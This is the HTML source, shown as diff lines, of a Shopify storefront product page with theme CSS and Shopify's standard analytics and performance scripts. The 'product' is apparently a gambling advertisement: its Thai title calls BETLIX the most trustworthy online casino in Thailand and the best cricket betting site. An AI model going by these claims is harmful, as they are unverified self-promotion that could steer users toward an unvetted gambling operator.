+        --blog-card-shadow-visible: 0;
+        --blog-card-shadow-horizontal-offset: 0.0rem;
+        --blog-card-shadow-vertical-offset: 0.4rem;
+        --blog-card-shadow-blur-radius: 0.5rem;
+
+        --badge-corner-radius: 4.0rem;
+
+        --popup-border-width: 1px;
+        --popup-border-opacity: 0.1;
+        --popup-corner-radius: 0px;
+        --popup-shadow-opacity: 0.05;
+        --popup-shadow-horizontal-offset: 0px;
+        --popup-shadow-vertical-offset: 4px;
+        --popup-shadow-blur-radius: 5px;
+
+        --drawer-border-width: 1px;
+        --drawer-border-opacity: 0.1;
+        --drawer-shadow-opacity: 0.0;
+        --drawer-shadow-horizontal-offset: 0px;
+        --drawer-shadow-vertical-offset: 4px;
+        --drawer-shadow-blur-radius: 5px;
+
+        --spacing-sections-desktop: 0px;
+        --spacing-sections-mobile: 0px;
+
+        --grid-desktop-vertical-spacing: 8px;
+        --grid-desktop-horizontal-spacing: 8px;
+        --grid-mobile-vertical-spacing: 4px;
+        --grid-mobile-horizontal-spacing: 4px;
+
+        --text-boxes-border-opacity: 0.1;
+        --text-boxes-border-width: 0px;
+        --text-boxes-radius: 0px;
+        --text-boxes-shadow-opacity: 0.0;
+        --text-boxes-shadow-visible: 0;
+        --text-boxes-shadow-horizontal-offset: 0px;
+        --text-boxes-shadow-vertical-offset: 4px;
+        --text-boxes-shadow-blur-radius: 5px;
+
+        --buttons-radius: 0px;
+        --buttons-radius-outset: 0px;
+        --buttons-border-width: 1px;
+        --buttons-border-opacity: 1.0;
+        --buttons-shadow-opacity: 0.0;
+        --buttons-shadow-visible: 0;
+        --buttons-shadow-horizontal-offset: 0px;
+        --buttons-shadow-vertical-offset: 4px;
+        --buttons-shadow-blur-radius: 5px;
+        --buttons-border-offset: 0px;
+
+        --inputs-radius: 0px;
+        --inputs-border-width: 1px;
+        --inputs-border-opacity: 0.55;
+        --inputs-shadow-opacity: 0.0;
+        --inputs-shadow-horizontal-offset: 0px;
+        --inputs-margin-offset: 0px;
+        --inputs-shadow-vertical-offset: 4px;
+        --inputs-shadow-blur-radius: 5px;
+        --inputs-radius-outset: 0px;
+
+        --variant-pills-radius: 40px;
+        --variant-pills-border-width: 1px;
+        --variant-pills-border-opacity: 0.55;
+        --variant-pills-shadow-opacity: 0.0;
+        --variant-pills-shadow-horizontal-offset: 0px;
+        --variant-pills-shadow-vertical-offset: 4px;
+        --variant-pills-shadow-blur-radius: 5px;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: inherit;
+      }
+
+      html {
+        box-sizing: border-box;
+        font-size: calc(var(--font-body-scale) * 62.5%);
+        height: 100%;
+      }
+
+      body {
+        display: grid;
+        grid-template-rows: auto auto 1fr auto;
+        grid-template-columns: 100%;
+        min-height: 100%;
+        margin: 0;
+        font-size: 1.5rem;
+        letter-spacing: 0.06rem;
+        line-height: calc(1 + 0.8 / var(--font-body-scale));
+        font-family: var(--font-body-family);
+        font-style: var(--font-body-style);
+        font-weight: var(--font-body-weight);
+      }
+
+      @media screen and (min-width: 750px) {
+        body {
+          font-size: 1.6rem;
+        }
+      }
+    </style>
+
+    <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/base.css?v=93405971894151239851707725440" rel="stylesheet" type="text/css" media="all" />
+<link rel="preload" as="font" href="//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=ca61822e0d1a049a979a9dc3e87b8eea121606100269011fb84d4888f230cd44" type="font/woff2" crossorigin><link rel="preload" as="font" href="//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=ca61822e0d1a049a979a9dc3e87b8eea121606100269011fb84d4888f230cd44" type="font/woff2" crossorigin><link
+        rel="stylesheet"
+        href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-predictive-search.css?v=118923337488134913561707725424"
+        media="print"
+        onload="this.media='all'"
+      ><script>
+      document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
+      if (Shopify.designMode) {
+        document.documentElement.classList.add('shopify-design-mode');
+      }
+    </script>
+  <link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
+<script>(function(){if ("sendBeacon" in navigator && "performance" in window) {var session_token = document.cookie.match(/_shopify_s=([^;]*)/);function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 68938727674,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token: session_token && session_token.length === 2 ? session_token[1] : "",page_type: "product"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());</script>
+<script id="web-pixels-manager-setup">(function e(e,n,a,t,r){var o="function"==typeof BigInt&&-1!==BigInt.toString().indexOf("[native code]")?"modern":"legacy";window.Shopify=window.Shopify||{};var i=window.Shopify;i.analytics=i.analytics||{};var s=i.analytics;s.replayQueue=[],s.publish=function(e,n,a){return s.replayQueue.push([e,n,a]),!0};try{self.performance.mark("wpm:start")}catch(e){}var l=[a,"/wpm","/b",r,o.substring(0,1),".js"].join("");!function(e){var n=e.src,a=e.async,t=void 0===a||a,r=e.onload,o=e.onerror,i=document.createElement("script"),s=document.head,l=document.body;i.async=t,i.src=n,r&&i.addEventListener("load",r),o&&i.addEventListener("error",o),s?s.appendChild(i):l?l.appendChild(i):console.error("Did not find a head or body element to append the script")}({src:l,async:!0,onload:function(){var a=window.webPixelsManager.init(e);n(a);var t=window.Shopify.analytics;t.replayQueue.forEach((function(e){var n=e[0],t=e[1],r=e[2];a.publishCustomEvent(n,t,r)})),t.replayQueue=[],t.publish=a.publishCustomEvent,t.visitor=a.visitor},onerror:function(){var n=e.storefrontBaseUrl.replace(/\/$/,""),a="".concat(n,"/.well-known/shopify/monorail/unstable/produce_batch"),r=JSON.stringify({metadata:{event_sent_at_ms:(new Date).getTime()},events:[{schema_id:"web_pixels_manager_load/2.0",payload:{version:t||"latest",page_url:self.location.href,status:"failed",error_msg:"".concat(l," has failed to load")},metadata:{event_created_at_ms:(new Date).getTime()}}]});try{if(self.navigator.sendBeacon.bind(self.navigator)(a,r))return!0}catch(e){}var o=new XMLHttpRequest;try{return o.open("POST",a,!0),o.setRequestHeader("Content-Type","text/plain"),o.send(r),!0}catch(e){console&&console.warn&&console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")}return!1}})})({shopId: 68938727674,storefrontBaseUrl: "https://d3dc94-3.myshopify.com",cdnBaseUrl: "https://d3dc94-3.myshopify.com/cdn",surface: "storefront-renderer",enabledBetaFlags: ["f6570685"],webPixelsConfigList: [{"id":"shopify-app-pixel","configuration":"{}","eventPayloadVersion":"v1","runtimeContext":"STRICT","scriptVersion":"0575","apiClientId":"shopify-pixel","type":"APP","purposes":["ANALYTICS"]},{"id":"shopify-custom-pixel","eventPayloadVersion":"v1","runtimeContext":"LAX","scriptVersion":"0575","apiClientId":"shopify-pixel","type":"CUSTOM","purposes":["ANALYTICS"]}],initData: {"cart":null,"checkout":null,"customer":null,"productVariants":[{"id":"45178743423226","image":{"src":"\/\/d3dc94-3.myshopify.com\/cdn\/shop\/files\/image.webp?v=1707735740"},"price":{"amount":888.0,"currencyCode":"THB"},"product":{"id":"8172904907002","title":"BETLIX \ud83d\udc8e \u0e04\u0e32\u0e2a\u0e34\u0e42\u0e19\u0e2d\u0e2d\u0e19\u0e44\u0e25\u0e19\u0e4c\u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e16\u0e37\u0e2d\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e43\u0e19\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 | \u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e40\u0e14\u0e34\u0e21\u0e1e\u0e31\u0e19\u0e04\u0e23\u0e34\u0e01\u0e40\u0e01\u0e47\u0e15\u0e17\u0e35\u0e48\u0e14\u0e35\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14!","untranslatedTitle":"BETLIX \ud83d\udc8e \u0e04\u0e32\u0e2a\u0e34\u0e42\u0e19\u0e2d\u0e2d\u0e19\u0e44\u0e25\u0e19\u0e4c\u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e16\u0e37\u0e2d\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e43\u0e19\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 | \u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e40\u0e14\u0e34\u0e21\u0e1e\u0e31\u0e19\u0e04\u0e23\u0e34\u0e01\u0e40\u0e01\u0e47\u0e15\u0e17\u0e35\u0e48\u0e14\u0e35\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14!","url":"\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94","vendor":"SEXYWIN","type":""},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}]},},function pageEvents(webPixelsManagerAPI) {webPixelsManagerAPI.publish("page_viewed");webPixelsManagerAPI.publish("product_viewed", {"productVariant":{"id":"45178743423226","image":{"src":"\/\/d3dc94-3.myshopify.com\/cdn\/shop\/files\/image.webp?v=1707735740"},"price":{"amount":888.0,"currencyCode":"THB"},"product":{"id":"8172904907002","title":"BETLIX \ud83d\udc8e \u0e04\u0e32\u0e2a\u0e34\u0e42\u0e19\u0e2d\u0e2d\u0e19\u0e44\u0e25\u0e19\u0e4c\u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e16\u0e37\u0e2d\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e43\u0e19\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 | \u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e40\u0e14\u0e34\u0e21\u0e1e\u0e31\u0e19\u0e04\u0e23\u0e34\u0e01\u0e40\u0e01\u0e47\u0e15\u0e17\u0e35\u0e48\u0e14\u0e35\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14!","untranslatedTitle":"BETLIX \ud83d\udc8e \u0e04\u0e32\u0e2a\u0e34\u0e42\u0e19\u0e2d\u0e2d\u0e19\u0e44\u0e25\u0e19\u0e4c\u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e16\u0e37\u0e2d\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e43\u0e19\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 | \u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e40\u0e14\u0e34\u0e21\u0e1e\u0e31\u0e19\u0e04\u0e23\u0e34\u0e01\u0e40\u0e01\u0e47\u0e15\u0e17\u0e35\u0e48\u0e14\u0e35\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14!","url":"\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94","vendor":"SEXYWIN","type":""},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}});},"https://d3dc94-3.myshopify.com/cdn","0.0.434","cc00d552w755d100bpc2f13081mb87193f6",);</script>  <script>window.ShopifyAnalytics = window.ShopifyAnalytics || {};
+window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
+window.ShopifyAnalytics.meta.currency = 'THB';
+var meta = {"product":{"id":8172904907002,"gid":"gid:\/\/shopify\/Product\/8172904907002","vendor":"SEXYWIN","type":"","variants":[{"id":45178743423226,"price":88800,"name":"BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!","public_title":null,"sku":""}]},"page":{"pageType":"product","resourceType":"product","resourceId":8172904907002}};
+for (var attr in meta) {
+  window.ShopifyAnalytics.meta[attr] = meta[attr];
+}</script>
+<script>window.ShopifyAnalytics.merchantGoogleAnalytics = function() {
+  
+};
+</script>
+<script class="analytics">(function () {
+    var customDocumentWrite = function(content) {
+      var jquery = null;
+
+      if (window.jQuery) {
+        jquery = window.jQuery;
+      } else if (window.Checkout && window.Checkout.$) {
+        jquery = window.Checkout.$;
+      }
+
+      if (jquery) {
+        jquery('body').append(content);
+      }
+    };
+
+    var hasLoggedConversion = function(token) {
+      if (token) {
+        return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+      }
+      return false;
+    }
+
+    var setCookieIfConversion = function(token) {
+      if (token) {
+        var twoMonthsFromNow = new Date(Date.now());
+        twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+        document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+      }
+    }
+
+    var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+    if (trekkie.integrations) {
+      return;
+    }
+    trekkie.methods = [
+      'identify',
+      'page',
+      'ready',
+      'track',
+      'trackForm',
+      'trackLink'
+    ];
+    trekkie.factory = function(method) {
+      return function() {
+        var args = Array.prototype.slice.call(arguments);
+        args.unshift(method);
+        trekkie.push(args);
+        return trekkie;
+      };
+    };
+    for (var i = 0; i < trekkie.methods.length; i++) {
+      var key = trekkie.methods[i];
+      trekkie[key] = trekkie.factory(key);
+    }
+    trekkie.load = function(config) {
+      trekkie.config = config || {};
+      trekkie.config.initialDocumentCookie = document.cookie;
+      var first = document.getElementsByTagName('script')[0];
+      var script = document.createElement('script');
+      script.type = 'text/javascript';
+      script.onerror = function(e) {
+        var scriptFallback = document.createElement('script');
+        scriptFallback.type = 'text/javascript';
+        scriptFallback.onerror = function(error) {
+                var Monorail = {
+      produce: function produce(monorailDomain, schemaId, payload) {
+        var currentMs = new Date().getTime();
+        var event = {
+          schema_id: schemaId,
+          payload: payload,
+          metadata: {
+            event_created_at_ms: currentMs,
+            event_sent_at_ms: currentMs
+          }
+        };
+        return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
+      },
+      sendRequest: function sendRequest(endpointUrl, payload) {
+        // Try the sendBeacon API
+        if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
+          var blobData = new window.Blob([payload], {
+            type: 'text/plain'
+          });
+
+          if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+            return true;
+          } // sendBeacon was not successful
+
+        } // XHR beacon
+
+        var xhr = new XMLHttpRequest();
+
+        try {
+          xhr.open('POST', endpointUrl);
+          xhr.setRequestHeader('Content-Type', 'text/plain');
+          xhr.send(payload);
+        } catch (e) {
+          console.log(e);
+        }
+
+        return false;
+      },
+      isIos12: function isIos12() {
+        return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+      }
+    };
+    Monorail.produce('monorail-edge.shopifysvc.com',
+      'trekkie_storefront_load_errors/1.1',
+      {shop_id: 68938727674,
+      theme_id: 140220072186,
+      app_name: "storefront",
+      context_url: window.location.href,
+      source_url: "//d3dc94-3.myshopify.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js"});
+
+        };
+        scriptFallback.async = true;
+        scriptFallback.src = '//d3dc94-3.myshopify.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+        first.parentNode.insertBefore(scriptFallback, first);
+      };
+      script.async = true;
+      script.src = '//d3dc94-3.myshopify.com/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+      first.parentNode.insertBefore(script, first);
+    };
+    trekkie.load(
+      {"Trekkie":{"appName":"storefront","development":false,"defaultAttributes":{"shopId":68938727674,"isMerchantRequest":null,"themeId":140220072186,"themeCityHash":"16355495993432057501","contentLanguage":"en","currency":"THB"},"isServerSideCookieWritingEnabled":true,"monorailRegion":"shop_domain"},"Session Attribution":{},"S2S":{"facebookCapiEnabled":false,"source":"trekkie-storefront-renderer"}}
+    );
+
+    var loaded = false;
+    trekkie.ready(function() {
+      if (loaded) return;
+      loaded = true;
+
+      window.ShopifyAnalytics.lib = window.trekkie;
+
+  
+      var originalDocumentWrite = document.write;
+      document.write = customDocumentWrite;
+      try { window.ShopifyAnalytics.merchantGoogleAnalytics.call(this); } catch(error) {};
+      document.write = originalDocumentWrite;
+
+      window.ShopifyAnalytics.lib.page(null,{"pageType":"product","resourceType":"product","resourceId":8172904907002});
+
+      var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+      var token = match? match[1]: undefined;
+      if (!hasLoggedConversion(token)) {
+        setCookieIfConversion(token);
+        window.ShopifyAnalytics.lib.track("Viewed Product",{"currency":"THB","variantId":45178743423226,"productId":8172904907002,"productGid":"gid:\/\/shopify\/Product\/8172904907002","name":"BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!","price":"888.00","sku":"","brand":"SEXYWIN","variant":null,"category":"","nonInteraction":true});
+      window.ShopifyAnalytics.lib.track("monorail:\/\/trekkie_storefront_viewed_product\/1.1",{"currency":"THB","variantId":45178743423226,"productId":8172904907002,"productGid":"gid:\/\/shopify\/Product\/8172904907002","name":"BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!","price":"888.00","sku":"","brand":"SEXYWIN","variant":null,"category":"","nonInteraction":true,"referer":"https:\/\/d3dc94-3.myshopify.com\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94"});
+      }
+    });
+
+
+        var eventsListenerScript = document.createElement('script');
+        eventsListenerScript.async = true;
+        eventsListenerScript.src = "//d3dc94-3.myshopify.com/cdn/shopifycloud/shopify/assets/shop_events_listener-a7c63dba65ccddc484f77541dc8ca437e60e1e9e297fe1c3faebf6523a0ede9b.js";
+        document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
+
+})();</script>
+<script class="boomerang">
+(function () {
+  if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
+    return;
+  }
+  window.BOOMR = window.BOOMR || {};
+  window.BOOMR.snippetStart = new Date().getTime();
+  window.BOOMR.snippetExecuted = true;
+  window.BOOMR.snippetVersion = 12;
+  window.BOOMR.application = "storefront-renderer";
+  window.BOOMR.themeName = "Dawn";
+  window.BOOMR.themeVersion = "13.0.0";
+  window.BOOMR.shopId = 68938727674;
+  window.BOOMR.themeId = 140220072186;
+  window.BOOMR.renderRegion = "gcp-asia-southeast1";
+  window.BOOMR.url =
+    "https://d3dc94-3.myshopify.com/cdn/shopifycloud/boomerang/shopify-boomerang-1.0.0.min.js";
+  var where = document.currentScript || document.getElementsByTagName("script")[0];
+  var parentNode = where.parentNode;
+  var promoted = false;
+  var LOADER_TIMEOUT = 3000;
+  function promote() {
+    if (promoted) {
+      return;
+    }
+    var script = document.createElement("script");
+    script.id = "boomr-scr-as";
+    script.src = window.BOOMR.url;
+    script.async = true;
+    parentNode.appendChild(script);
+    promoted = true;
+  }
+  function iframeLoader(wasFallback) {
+    promoted = true;
+    var dom, bootstrap, iframe, iframeStyle;
+    var doc = document;
+    var win = window;
+    window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
+    bootstrap = function(parent, scriptId) {
+      var script = doc.createElement("script");
+      script.id = scriptId || "boomr-if-as";
+      script.src = window.BOOMR.url;
+      BOOMR_lstart = new Date().getTime();
+      parent = parent || doc.body;
+      parent.appendChild(script);
+    };
+    if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
+      window.BOOMR.snippetMethod = "s";
+      bootstrap(parentNode, "boomr-async");
+      return;
+    }
+    iframe = document.createElement("IFRAME");
+    iframe.src = "about:blank";
+    iframe.title = "";
+    iframe.role = "presentation";
+    iframe.loading = "eager";
+    iframeStyle = (iframe.frameElement || iframe).style;
+    iframeStyle.width = 0;
+    iframeStyle.height = 0;
+    iframeStyle.border = 0;
+    iframeStyle.display = "none";
+    parentNode.appendChild(iframe);
+    try {
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    } catch (e) {
+      dom = document.domain;
+      iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    }
+    if (dom) {
+      doc._boomrl = function() {
+        this.domain = dom;
+        bootstrap();
+      };
+      doc.write("<body onload='document._boomrl();'>");
+    } else {
+      win._boomrl = function() {
+        bootstrap();
+      };
+      if (win.addEventListener) {
+        win.addEventListener("load", win._boomrl, false);
+      } else if (win.attachEvent) {
+        win.attachEvent("onload", win._boomrl);
+      }
+    }
+    doc.close();
+  }
+  var link = document.createElement("link");
+  if (link.relList &&
+    typeof link.relList.supports === "function" &&
+    link.relList.supports("preload") &&
+    ("as" in link)) {
+    window.BOOMR.snippetMethod = "p";
+    link.href = window.BOOMR.url;
+    link.rel = "preload";
+    link.as = "script";
+    link.addEventListener("load", promote);
+    link.addEventListener("error", function() {
+      iframeLoader(true);
+    });
+    setTimeout(function() {
+      if (!promoted) {
+        iframeLoader(true);
+      }
+    }, LOADER_TIMEOUT);
+    BOOMR_lstart = new Date().getTime();
+    parentNode.appendChild(link);
+  } else {
+    iframeLoader(false);
+  }
+  function boomerangSaveLoadTime(e) {
+    window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
+  }
+  if (window.addEventListener) {
+    window.addEventListener("load", boomerangSaveLoadTime, false);
+  } else if (window.attachEvent) {
+    window.attachEvent("onload", boomerangSaveLoadTime);
+  }
+  if (document.addEventListener) {
+    document.addEventListener("onBoomerangLoaded", function(e) {
+      e.detail.BOOMR.init({
+        ResourceTiming: {
+          enabled: true,
+          trackedResourceTypes: ["script", "img", "css"]
+        },
+      });
+      e.detail.BOOMR.t_end = new Date().getTime();
+    });
+  } else if (document.attachEvent) {
+    document.attachEvent("onpropertychange", function(e) {
+      if (!e) e=event;
+      if (e.propertyName === "onBoomerangLoaded") {
+        e.detail.BOOMR.init({
+          ResourceTiming: {
+            enabled: true,
+            trackedResourceTypes: ["script", "img", "css"]
+          },
+        });
+        e.detail.BOOMR.t_end = new Date().getTime();
+      }
+    });
+  }
+})();</script>
+</head>
+
+  <body class="gradient">
+    <a class="skip-to-content-link button visually-hidden" href="#MainContent">
+      Skip to content
+    </a><!-- BEGIN sections: header-group -->
+<div id="shopify-section-sections--17446643761402__header" class="shopify-section shopify-section-group-header-group section-header"><link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css?v=151968516119678728991707725431" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-search.css?v=165164710990765432851707725419" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-menu-drawer.css?v=85170387104997277661707725422" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-cart-notification.css?v=54116361853792938221707725417" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-cart-items.css?v=136978088507021421401707725440" media="print" onload="this.media='all'"><link rel="stylesheet" href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101707725421" media="print" onload="this.media='all'"><noscript><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css?v=151968516119678728991707725431" rel="stylesheet" type="text/css" media="all" /></noscript>
+<noscript><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-search.css?v=165164710990765432851707725419" rel="stylesheet" type="text/css" media="all" /></noscript>
+<noscript><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-menu-drawer.css?v=85170387104997277661707725422" rel="stylesheet" type="text/css" media="all" /></noscript>
+<noscript><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-cart-notification.css?v=54116361853792938221707725417" rel="stylesheet" type="text/css" media="all" /></noscript>
+<noscript><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-cart-items.css?v=136978088507021421401707725440" rel="stylesheet" type="text/css" media="all" /></noscript>
+
+<style>
+  header-drawer {
+    justify-self: start;
+    margin-left: -1.2rem;
+  }@media screen and (min-width: 990px) {
+      header-drawer {
+        display: none;
+      }
+    }.menu-drawer-container {
+    display: flex;
+  }
+
+  .list-menu {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+  }
+
+  .list-menu--inline {
+    display: inline-flex;
+    flex-wrap: wrap;
+  }
+
+  summary.list-menu__item {
+    padding-right: 2.7rem;
+  }
+
+  .list-menu__item {
+    display: flex;
+    align-items: center;
+    line-height: calc(1 + 0.3 / var(--font-body-scale));
+  }
+
